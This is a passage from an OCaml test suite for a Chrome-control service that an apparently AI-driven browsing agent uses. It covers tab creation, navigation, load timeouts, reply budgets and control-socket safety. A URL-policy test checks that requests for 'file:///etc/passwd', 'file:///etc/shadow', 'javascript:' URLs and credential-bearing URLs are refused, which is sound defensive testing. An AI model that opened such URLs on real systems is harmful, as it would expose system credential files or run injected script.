(* L3: chrome-qnul chrome-1yn9 chrome-akz4 chrome-2n8n chrome-hjw9
   chrome-fuao chrome-38a4 chrome-d4mz chrome-2z2z chrome-6lfk; L5: chrome-qnul (a [new]
   with a url waits for the load exactly as [nav] does, one without a url replies at once). *)
module P = Leash.Protocol
module Fake = Leash_test_support.Fake_browser
module Chrome = Leash.Chrome
module Run = Leash.Run

let obj xs = `Assoc xs
let str s = `String s
let field key = function `Assoc xs -> List.assoc_opt key xs | _ -> None

let get key json =
  match field key json with Some x -> x | None -> Alcotest.fail ("missing " ^ key)

let tab json =
  match P.Handle.t_of_yojson (get "tab" json) with
  | Ok x -> x
  | Error e -> Alcotest.fail e

let code = function
  | P.Failure e -> P.Error_code.to_string e.code
  | _ -> Alcotest.fail "expected failure"

let result = function
  | P.Success json -> json
  | P.Failure e -> Alcotest.failf "%s: %s" (P.Error_code.to_string e.code) e.message

let request tabs _client command =
  let wire = P.encode_request { command } |> Yojson.Safe.to_string in
  match P.decode_reply (Yojson.Safe.from_string (Leash.Control.handle tabs wire)) with
  | Ok x -> x
  | Error e -> Alcotest.fail e

let check_code label expected reply = Alcotest.(check string) label expected (code reply)

let contains text sub =
  let rec search i =
    i + String.length sub <= String.length text
    && (String.sub text i (String.length sub) = sub || search (i + 1))
  in
  search 0

(* pilot-ukoh pilot-x1f3: mission ownership never invokes the legacy JEV chooser. *)
let levels_with ?plan answers _questions =
  let first = ref true in
  let goals =
    ref
      (List.filter
         (fun answer ->
           (not (String.contains answer '.')) && answer <> "DONE" && answer <> "BLOCKED")
         answers)
  in
  let reply answer =
    Run.
      {
        answer;
        expect = [];
        reasoning_summary = None;
        secrets_for_operator = [];
        usage = None;
      }
  in
  Run.
    {
      choose =
        (fun ~deadline:_ _ -> Alcotest.fail "mission invoked the withdrawn JEV selector");
      score = (fun ~deadline:_ ~sentence:_ ~state:_ -> Ok 1.);
      plan =
        (fun ~deadline:_ request ->
          if !first then (
            first := false;
            let goal =
              match !goals with
              | [] -> request.mission
              | goal :: rest ->
                  goals := rest;
                  goal
            in
            Ok (reply (Leg goal)))
          else
            match plan with
            | Some plan -> Ok plan
            | None -> (
                match !goals with
                | goal :: rest ->
                    goals := rest;
                    Ok (reply (Leg goal))
                | [] ->
                    Ok
                      (reply
                         (if
                            List.for_all
                              (fun (leg : Run.leg) -> leg.outcome = "done")
                              request.legs
                          then
                            Done
                              {
                                result = "Navigation completed";
                                evidence = [ "Navigator reported DONE" ];
                                records = [];
                              }
                          else Fail "navigation did not complete"))));
    }

let rig
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) ?reporter ?download_dir ?handoff_timeout_s f =
  Ox_test.run (fun env sw ->
      let mgr = Ox_test.Process.make [ Block_until_signal; Block_until_signal ] in
      let current = ref None in
      let launch
          ~(caps : < Ox_caps.Cap.exec ; Ox_caps.Cap.fork ; Ox_caps.Cap.fs_write ; .. >)
          ~sw ~clock ~mgr:_ config =
        let fake, client = Fake.create ~sw () in
        current := Some fake;
        match
          Ox_process.Child.spawn ~caps ~sw ~clock ~mgr:(Ox_test.Process.mgr mgr)
            ~argv:(Chrome.argv config) ~grace:(Ox.Duration.ms 50) ~fds:[] ()
        with
        | Error e -> Error e
        | Ok child -> Ok (child, { Leash.Cdp.read = client.read; write = client.write })
      in
      let logger =
        Ox_observability.Logger.create ~service:"leash-tests" ~clock:env#clock
          ~mono_clock:env#mono_clock
          ~reporter:
            (Option.value reporter
               ~default:(Ox_observability.Logger.Reporter.writer ignore))
          ()
      in
      let chrome =
        Chrome.create ~sw ~launch:(launch ~caps)
          (Chrome.make ~binary:"/bin/sh" ~profile_dir:"/tmp/leash-test-profile"
             ~workspace:"test" ~headless:false ())
          {
            Chrome.clock = env#clock;
            mgr = env#process_mgr;
            logger;
            caps :> Leash.Chrome.caps;
          }
      in
      let tabs =
        Leash.Tabs.create ~sw ~cap:2 ~tombstone_s:3600 ?download_dir ?handoff_timeout_s
          {
            Leash.Tabs.chrome;
            clock = env#clock;
            logger;
            desktop = Leash.Desktop.disabled;
            caps :> Leash.Tabs.caps;
          }
      in
      let rec ready n =
        if n = 0 then Alcotest.fail "no Chrome"
        else if (Chrome.status chrome).phase <> `Running then (
          Eio.Fiber.yield ();
          ready (n - 1))
      in
      ready 1000;
      let fake () = match !current with Some x -> x | None -> Alcotest.fail "no fake" in
      f env sw chrome tabs fake)

(* The Target.getTargetInfo reply the registry reads once a load is done: the document's
   title and committed URL, which real Chrome's pushed targetInfoChanged does not carry. *)
let document ~title ~url =
  obj
    [
      ( "targetInfo",
        obj
          [
            ("targetId", str "target-1");
            ("type", str "page");
            ("title", str title);
            ("url", str url);
          ] );
    ]

(* chrome-qnul: [new] with a url subscribes before Page.navigate and waits for the
   load event, so every test that creates such a tab has to answer it. The pushed title is Chrome's tab-strip title — the formatted
   URL ("example.com" for https://example.com/), see docs/cdp-shapes.md — and the document
   title only comes from the query above, made once the load is done. *)
let loads ?title fake =
  Fake.on_method fake "Page.navigate" (fun request ->
      let session =
        match get "sessionId" request with `String s -> s | _ -> assert false
      in
      Option.iter
        (fun title ->
          Fake.emit ~session fake ~method_:"Target.targetInfoChanged"
            ~params:
              (obj
                 [
                   ( "targetInfo",
                     obj
                       [
                         ("targetId", str "target-1");
                         ("type", str "page");
                         ("title", str title);
                         ("url", str "https://example.com");
                       ] );
                 ]))
        title;
      Fake.emit ~session fake ~method_:"Page.loadEventFired"
        ~params:(Fake.event "Page.loadEventFired");
      obj [])

let lifecycle
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      loads (fake ());
      Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
          document ~title:"Example" ~url:"https://example.com");
      let info =
        result
          (request tabs "alice"
             (P.New { url = Some "https://example.com"; label = None }))
      in
      let h = tab info in
      Alcotest.(check bool)
        "chrome-qnul random handle" true
        (String.starts_with ~prefix:"t_" (P.Handle.to_string h));
      let mine = result (request tabs "alice" P.List_tabs) |> get "tabs" in
      let theirs = result (request tabs "bob" P.List_tabs) |> get "tabs" in
      let visible_without_handle = function
        | `List [ `Assoc fields ] ->
            (not (List.mem_assoc "tab" fields)) && not (List.mem_assoc "handle" fields)
        | _ -> false
      in
      Alcotest.(check bool)
        "hand-x3hi list shows the tab and never the handle" true
        (visible_without_handle mine && mine = theirs);
      Alcotest.(check bool)
        "cut-0oal no playbook, no page kind" true
        (match mine with
        | `List [ `Assoc fields ] -> not (List.mem_assoc "page_kind" fields)
        | _ -> false);
      let status = result (request tabs "alice" P.Status) in
      Alcotest.(check bool)
        "chrome-fuao generation and open" true
        (get "generation" status = `Int 1 && get "open" (get "tabs" status) = `Int 1);
      let methods =
        Fake.received (fake ())
        |> List.filter_map (fun j ->
            match field "method" j with Some (`String s) -> Some s | _ -> None)
      in
      Alcotest.(check bool) "attached" true (List.mem "Target.attachToTarget" methods);
      let bad =
        match P.Handle.of_string "t_not_a_tab" with
        | Ok h -> h
        | Error e -> Alcotest.fail e
      in
      check_code "hand-mb9s unknown handle" "unknown-tab"
        (request tabs "bob"
           (P.Drive
              {
                tab = Some bad;
                mission = "Do a task";
                max_steps = None;
                start_url = None;
                max_procedures = None;
                expect = None;
                out = None;
                secrets = [];
                deadline_s = None;
                dry_run = Some true;
              }));
      Alcotest.(check int)
        "hand-mb9s a missing capability never reaches the browser" (List.length methods)
        (List.length (Fake.received (fake ())));
      ignore (result (request tabs "bob" (P.Close { tab = h })));
      ignore (result (request tabs "alice" (P.Close { tab = h })));
      ignore (result (request tabs "alice" (P.Close { tab = h })));
      Alcotest.(check bool)
        "chrome-2n8n closed" true
        (get "open" (get "tabs" (result (request tabs "alice" P.Status))) = `Int 0))

let safety
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs _ ->
      List.iter
        (fun url ->
          check_code "chrome-akz4 policy" "url-refused"
            (request tabs "alice" (P.New { url = Some url; label = None })))
        [ "file:///etc/passwd"; "javascript:alert(1)"; "https://user:pw@example.com" ];
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      check_code "chrome-akz4 nav" "url-refused"
        (request tabs "alice" (P.Nav { tab = h; url = "file:///etc/shadow" }));
      ignore (result (request tabs "alice" (P.New { url = None; label = None })));
      check_code "chrome-d4mz cap" "tab-cap"
        (request tabs "alice" (P.New { url = None; label = None })))

let nav
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      Fake.on_method (fake ()) "Page.navigate" (fun request ->
          let session =
            match get "sessionId" request with `String s -> s | _ -> assert false
          in
          Fake.emit ~session (fake ()) ~method_:"Page.frameNavigated"
            ~params:(Fake.event "Page.frameNavigated");
          Fake.emit ~session (fake ()) ~method_:"Page.domContentEventFired"
            ~params:(Fake.event "Page.domContentEventFired");
          obj [ ("frameId", str "frame-1"); ("loaderId", str "loader-2") ]);
      Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
          document ~title:"Example Domain" ~url:"https://example.com/next");
      let reply =
        result
          (request tabs "alice" (P.Nav { tab = h; url = "https://example.com/start" }))
      in
      let asked =
        Fake.received (fake ())
        |> List.find_map (fun json ->
            match field "method" json with
            | Some (`String "Page.navigate") -> (
                match field "params" json with
                | Some params -> Some (get "url" params)
                | None -> None)
            | _ -> None)
      in
      Alcotest.(check bool)
        "chrome-1yn9 navigates to the requested url" true
        (asked = Some (str "https://example.com/start"));
      Alcotest.(check bool)
        "chrome-1yn9 reports the committed url" true
        (get "url" reply = str "https://example.com/next");
      Alcotest.(check bool)
        "chrome-1yn9 title after load" true
        (get "title" reply = str "Example Domain"))

(* A request that waits for a load event nobody will send never settles. The suite bounds
   the wait with yields so a missing immediate reply fails rather than hangs: the mock
   clock never advances by itself, so no timeout can rescue a wait that should not exist. *)
let settle ~sw what f =
  let cell = ref None in
  Eio.Fiber.fork ~sw (fun () -> cell := Some (f ()));
  let rec loop n =
    match !cell with
    | Some value -> value
    | None ->
        if n = 0 then Alcotest.fail (what ^ " did not reply without a load event")
        else (
          Eio.Fiber.yield ();
          loop (n - 1))
  in
  loop 10_000

(* chrome-qnul: the title is only known once the document has loaded, so [new] waits for
   the load event exactly as [nav] does before it replies. *)
let new_waits
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      loads ~title:"example.com" (fake ());
      Fake.on_method (fake ()) "Target.getTargetInfo" (fun _ ->
          document ~title:"Example Domain" ~url:"https://example.com/");
      let info =
        result
          (request tabs "alice"
             (P.New { url = Some "https://example.com"; label = None }))
      in
      Alcotest.(check bool)
        "chrome-qnul committed url" true
        (get "url" info = str "https://example.com/");
      Alcotest.(check bool)
        "chrome-qnul title after load" true
        (get "title" info = str "Example Domain");
      (* chrome-qnul: a fast local document may finish during Target.createTarget. *)
      let calls = Fake.received (fake ()) in
      let methods =
        List.filter_map
          (fun call ->
            match field "method" call with Some (`String name) -> Some name | _ -> None)
          calls
      in
      let index name =
        let rec go n = function
          | [] -> Alcotest.fail ("missing " ^ name)
          | x :: xs -> if x = name then n else go (n + 1) xs
        in
        go 0 methods
      in
      Alcotest.(check bool)
        "chrome-qnul subscribe before navigate" true
        (index "Page.enable" < index "Page.navigate");
      let creation =
        List.find
          (fun call -> field "method" call = Some (str "Target.createTarget"))
          calls
      in
      Alcotest.(check bool)
        "chrome-qnul initially blank" true
        (get "url" (get "params" creation) = str "about:blank"))

(* chrome-qnul: without a url there is nothing to await, so the reply must not wait for a
   load event — none is emitted here, and the mocked clock never moves. *)
let new_without_url
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ sw _ tabs _ ->
      let info =
        settle ~sw "chrome-qnul new without a url" (fun () ->
            request tabs "alice" (P.New { url = None; label = None }))
        |> result
      in
      Alcotest.(check bool)
        "chrome-qnul about:blank" true
        (get "url" info = str "about:blank");
      Alcotest.(check bool) "chrome-qnul empty title" true (get "title" info = str ""))

(* field-m5jw, chrome-qnul, chrome-1yn9: missing load events retain the
   registered handle and report loaded:false rather than losing it to an error. *)
let load_timeout
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun env sw _ tabs _ ->
      (* One second at a time: the CDP calls around a load answer within a step or two,
         so only the registry's own 30-second bound is still running when it expires. *)
      let after_deadline what f =
        let cell = ref None in
        Eio.Fiber.fork ~sw (fun () -> cell := Some (f ()));
        let rec settle_calls n =
          if n > 0 && !cell = None then (
            Eio.Fiber.yield ();
            settle_calls (n - 1))
        in
        settle_calls 100;
        let rec await n =
          match !cell with
          | Some reply -> reply
          | None ->
              if n = 0 then Alcotest.fail (what ^ " did not time out")
              else (
                Ox_test.advance env#clock (Ox.Duration.seconds 1);
                Eio.Fiber.yield ();
                await (n - 1))
        in
        await 60
      in

      let handle =
        result (request tabs "alice" (P.New { url = None; label = None })) |> tab
      in
      let nav =
        after_deadline "chrome-1yn9 nav" (fun () ->
            request tabs "alice"
              (P.Nav { tab = handle; url = "https://example.com/slow" }))
      in
      let created =
        after_deadline "chrome-qnul new" (fun () ->
            request tabs "alice"
              (P.New { url = Some "https://example.com/slow"; label = None }))
      in
      let nav = result nav and created = result created in
      Alcotest.(check bool)
        "field-m5jw nav load unfinished" true
        (get "loaded" nav = `Bool false);
      Alcotest.(check bool)
        "field-m5jw new load unfinished" true
        (get "loaded" created = `Bool false);
      Alcotest.(check bool) "field-m5jw nav retains handle" true (tab nav = handle);
      Alcotest.(check bool)
        "field-m5jw new handle immediately usable" true
        (match
           request tabs "alice"
             (P.Debug { tab = tab created; limit = None; clear = None })
         with
        | P.Success _ -> true
        | P.Failure _ -> false))

(* chrome-qnul, chrome-1yn9, tab-0ohq: the listener must outlast the registry's own bounds
   -- a load's thirty seconds, and a trusted input's CDP deadline plus the probes after it
   -- or a slow page's reply never reaches the client and its connection just closes. *)
let budget () =
  let handle =
    match P.Handle.of_string "t_budget" with Ok h -> h | Error why -> Alcotest.fail why
  in
  let snapshot =
    match P.Snapshot_id.of_string "s_budget" with
    | Ok s -> s
    | Error why -> Alcotest.fail why
  in
  let ms command =
    match Leash.Control.budget (Ok P.{ command }) with
    | Some duration -> Ox.Duration.to_ms duration
    | None -> Alcotest.fail "no budget"
  in
  Alcotest.(check bool)
    "chrome-qnul new with a url outlasts the load wait" true
    (ms (P.New { url = Some "https://example.com"; label = None }) > 30_000);
  Alcotest.(check int)
    "chrome-qnul new without a url" 1_000
    (ms (P.New { url = None; label = None }));
  Alcotest.(check int)
    "chrome-qnul new about:blank" 1_000
    (ms (P.New { url = Some "about:blank"; label = None }));
  Alcotest.(check bool)
    "chrome-1yn9 nav outlasts the load wait" true
    (ms (P.Nav { tab = handle; url = "https://example.com" }) > 30_000);
  Alcotest.(check bool)
    "tab-0ohq a row action outlasts the settlement deadline" true
    (ms
       (P.Click
          { tab = handle; snapshot; index = 1; snap = None; match_ = None; limit = None })
    > 30_000);
  (* L32 run-obtt: the margin covers the last expectation wait and a planner turn's
     correction call, so a run that stops at the planner still answers. *)
  Alcotest.(check int)
    "pilot-x1f3 explicit deadline overrides pilot default and includes human wait"
    1_275_000
    (ms
       (P.Drive
          {
            tab = Some handle;
            mission = "do the thing";
            max_steps = None;
            start_url = None;
            max_procedures = None;
            deadline_s = Some 900;
            dry_run = None;
            expect = None;
            out = None;
            secrets = [];
          }));
  Alcotest.(check int) "other commands keep one second" 1_000 (ms P.Status)

let malformed
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs _ ->
      let reply =
        Yojson.Safe.from_string
          (Leash.Control.handle tabs {|{"v":1,"cmd":"new","args":{"url":77}}|})
      in
      let error = get "error" reply in
      Alcotest.(check bool)
        "chrome-38a4 invalid and pointer" true
        (get "code" error = str "invalid-request"
        && String.contains (Yojson.Safe.to_string (get "message" error)) '.'))

let lost
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ chrome tabs fake ->
      let h = result (request tabs "alice" (P.New { url = None; label = None })) |> tab in
      Fake.drop (fake ());
      let rec await n =
        if n = 0 then Alcotest.fail "Chrome did not restart"
        else if (Chrome.status chrome).phase <> `Restarting then (
          Eio.Fiber.yield ();
          await (n - 1))
      in
      await 1000;
      let rec gone n =
        if n = 0 then Alcotest.fail "no tombstone"
        else
          match request tabs "alice" (P.Close { tab = h }) with
          | P.Failure e when P.Error_code.to_string e.code = "tab-gone" ->
              Alcotest.(check bool)
                "chrome-2z2z browser_lost" true
                (match e.detail with
                | Some j -> get "disposition" j = str "browser_lost"
                | None -> false)
          | _ ->
              Eio.Fiber.yield ();
              gone (n - 1)
      in
      gone 1000;
      check_code "chrome-6lfk restart" "browser-unavailable"
        (request tabs "alice" (P.New { url = None; label = None })))

let with_runtime ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.tmp ; .. >) f =
  let runtime = Ox_caps.Cap_stdlib.Filename.temp_file ~caps "leash-control-" "" in
  Ox_caps.Cap_unix.unlink ~caps runtime;
  Ox_caps.Cap_unix.mkdir ~caps runtime 0o700;
  Fun.protect
    ~finally:(fun () ->
      let dir = Filename.concat runtime "leash" in
      let unlink ~(caps : < Ox_caps.Cap.fs_write ; .. >) path =
        if Sys.file_exists path then Ox_caps.Cap_unix.unlink ~caps path
      in
      unlink ~caps (Filename.concat dir "control.sock");
      unlink ~caps (Filename.concat dir "control.sock.lock");
      if Sys.file_exists dir then Ox_caps.Cap_unix.rmdir ~caps dir;
      Ox_caps.Cap_unix.chmod ~caps runtime 0o700;
      Ox_caps.Cap_unix.rmdir ~caps runtime)
    (fun () -> f runtime)

(* svc-o4wt: the control socket is the configured path; these tests keep the default
   layout under their own runtime directory. *)
let socket runtime = Filename.concat (Filename.concat runtime "leash") "control.sock"

(* tab-x4v0: a text reply bigger than the listener old 64 KiB ceiling arrives whole
   over a real socket; the service answers instead of closing the connection. *)
let large_text_over_socket
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.network
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs fake ->
          let h =
            result (request tabs "alice" (P.New { url = None; label = None })) |> tab
          in
          let big = String.make 70_000 'x' in
          Fake.on_method (fake ()) "Runtime.evaluate" (fun request ->
              if
                get "expression" (get "params" request)
                = str Leash__Snapshot_source.interactive_count_expression
              then obj [ ("result", obj [ ("type", str "number"); ("value", `Int 0) ]) ]
              else obj [ ("result", obj [ ("type", str "string"); ("value", str big) ]) ]);
          let _control =
            match
              Leash.Control.create ~sw ~path:(socket runtime)
                {
                  Leash.Control.tabs;
                  status_query = (fun () -> []);
                  models_status =
                    (fun () ->
                      Leash.Protocol.
                        {
                          configured = false;
                          jev_model = "unconfigured";
                          text_model = "";
                          systemone_endpoint = "";
                          chat_base_url = "";
                        });
                  fs = env#fs;
                  net = env#net;
                  clock = env#clock;
                  logger =
                    Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                      ~mono_clock:env#mono_clock
                      ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                      ();
                  caps :> Leash.Control.caps;
                }
            with
            | Ok control -> control
            | Error _ -> Alcotest.fail "tab-x4v0 listener refused"
          in
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          let line =
            P.encode_request
              { command = P.Text { tab = h; index = None; max_chars = None } }
            |> Yojson.Safe.to_string
          in
          Eio.Flow.copy_string (line ^ "\n") flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:1_048_576)
            |> Yojson.Safe.from_string
          in
          match P.decode_reply reply with
          | Error why -> Alcotest.fail why
          | Ok (P.Failure error) ->
              Alcotest.failf "%s: %s" (P.Error_code.to_string error.code) error.message
          | Ok (P.Success json) ->
              let text =
                match field "text" json with
                | Some (`String text) -> text
                | _ -> Alcotest.fail "tab-x4v0 no text in reply"
              in
              Alcotest.(check int)
                "tab-x4v0 the whole bounded text" 65_536 (String.length text);
              Alcotest.(check bool)
                "tab-x4v0 truncated" true
                (get "truncated" json = `Bool true)))

let socket
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.network
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs _ ->
          let make ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps :> Leash.Control.caps;
              }
          in
          (match make ~caps () with
          | Ok _ -> ()
          | Error _ -> Alcotest.fail "private listener refused");
          let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
          Alcotest.(check int)
            "chrome-fwnu private socket" 0
            ((Unix.lstat path).st_perm land 0o077);
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          Eio.Flow.copy_string {|{"v":1,"cmd":"status","args":{}}
|} flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "real socket status reply" true
            (get "ok" reply = `Bool true);
          match make ~caps () with
          | Ok _ -> Alcotest.fail "chrome-fwnu replaced live listener"
          | Error _ -> ()));
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs _ ->
          let dir = Filename.concat runtime "leash" in
          Ox_caps.Cap_unix.mkdir ~caps dir 0o700;
          let path = Filename.concat dir "control.sock" in
          let fd =
            Ox_caps.Cap_unix.openfile ~caps path [ Unix.O_CREAT; Unix.O_WRONLY ] 0o600
          in
          Unix.close fd;
          let create ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps :> Leash.Control.caps;
              }
          in
          (match create ~caps () with
          | Ok _ -> Alcotest.fail "chrome-fwnu replaced a regular file"
          | Error _ -> ());
          Alcotest.(check bool)
            "regular file untouched" true
            ((Unix.lstat path).st_kind = Unix.S_REG)));
  with_runtime ~caps (fun runtime ->
      rig ~caps (fun env sw _ tabs _ ->
          let dir = Filename.concat runtime "leash" in
          Ox_caps.Cap_unix.mkdir ~caps dir 0o700;
          Ox_caps.Cap_unix.chmod ~caps dir 0o755;
          let result =
            Leash.Control.create ~sw ~path:(socket runtime)
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps :> Leash.Control.caps;
              }
          in
          let verdict =
            match result with
            | Ok _ -> Alcotest.fail "chrome-fwnu accepted unsafe socket directory"
            | Error _ -> ()
          in
          Ox_caps.Cap_unix.chmod ~caps dir 0o700;
          verdict))

(* svc-5wm8: one socket path has one listener. A second listener on the same path is
   refused with [`Active_listener] and does not unlink the live socket, so the first
   instance keeps answering: the operator sees a refusal at boot instead of two
   services fighting over one Chrome profile. *)
let listener_error = function
  | `Invalid_policy why -> "Invalid_policy " ^ why
  | `Unsafe_runtime_dir -> "Unsafe_runtime_dir"
  | `Inaccessible_runtime_dir -> "Inaccessible_runtime_dir"
  | `Ownership_conflict why -> "Ownership_conflict " ^ why
  | `Active_listener -> "Active_listener"
  | `Lock_conflict -> "Lock_conflict"
  | `Lock_identity -> "Lock_identity"
  | `Probe_failed -> "Probe_failed"
  | `Bind_failed why -> "Bind_failed " ^ why

let second_instance
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.network
       ; Ox_caps.Cap.random
       ; Ox_caps.Cap.tmp
       ; .. >) () =
  with_runtime ~caps (fun runtime ->
      (* [socket] is the Alcotest case below, so take the path from the layout. *)
      let path = Filename.concat (Filename.concat runtime "leash") "control.sock" in
      rig ~caps (fun env sw _ tabs _ ->
          let create ~(caps : < Ox_caps.Cap.fs_write ; Ox_caps.Cap.network ; .. >) () =
            Leash.Control.create ~sw ~path
              {
                Leash.Control.tabs;
                status_query = (fun () -> []);
                models_status =
                  (fun () ->
                    Leash.Protocol.
                      {
                        configured = false;
                        jev_model = "unconfigured";
                        text_model = "";
                        systemone_endpoint = "";
                        chat_base_url = "";
                      });
                fs = env#fs;
                net = env#net;
                clock = env#clock;
                logger =
                  Ox_observability.Logger.create ~service:"socket-test" ~clock:env#clock
                    ~mono_clock:env#mono_clock
                    ~reporter:(Ox_observability.Logger.Reporter.writer ignore)
                    ();
                caps :> Leash.Control.caps;
              }
          in
          (match create ~caps () with
          | Ok _ -> ()
          | Error error ->
              Alcotest.failf "svc-5wm8 the first listener was refused: %s"
                (listener_error error));
          (* The lock file is what stops a second instance before the socket probe, so
             the refusal is [`Lock_conflict]; [`Active_listener] is the same refusal seen
             when only a live socket is there. Either one is the story: no second listener. *)
          (match create ~caps () with
          | Ok _ -> Alcotest.fail "svc-5wm8 a second instance started on the owned socket"
          | Error `Lock_conflict | Error `Active_listener -> ()
          | Error error ->
              Alcotest.failf "svc-5wm8 expected a refusal, got %s" (listener_error error));
          let flow = Eio.Net.connect ~sw env#net (`Unix path) in
          Eio.Flow.copy_string {|{"v":1,"cmd":"status","args":{}}
|} flow;
          let reply =
            Eio.Buf_read.line (Eio.Buf_read.of_flow flow ~max_size:4096)
            |> Yojson.Safe.from_string
          in
          Alcotest.(check bool)
            "svc-5wm8 the first instance still answers after the refusal" true
            (get "ok" reply = `Bool true)))

let non_web_tab_labels
    ~(caps :
       < Ox_caps.Cap.env
       ; Ox_caps.Cap.exec
       ; Ox_caps.Cap.fork
       ; Ox_caps.Cap.fs_read
       ; Ox_caps.Cap.fs_write
       ; Ox_caps.Cap.random
       ; .. >) () =
  rig ~caps (fun _ _ _ tabs fake ->
      let agent =
        result (request tabs "alice" (P.New { url = None; label = None })) |> tab
      in
      Fake.emit (fake ()) ~method_:"Target.attachedToTarget"
        ~params:
          (obj
             [
               ("sessionId", str "human-session");
               ( "targetInfo",
                 obj
                   [
                     ("targetId", str "human-target");
                     ("type", str "page");
                     ("url", str "chrome://newtab/");
                     ("title", str "New Tab");
                   ] );
             ]);
      let rec await n =
        if n = 0 then Alcotest.fail "kind-a7uy human newtab was not adopted"
        else
          match get "tabs" (result (request tabs "alice" P.List_tabs)) with
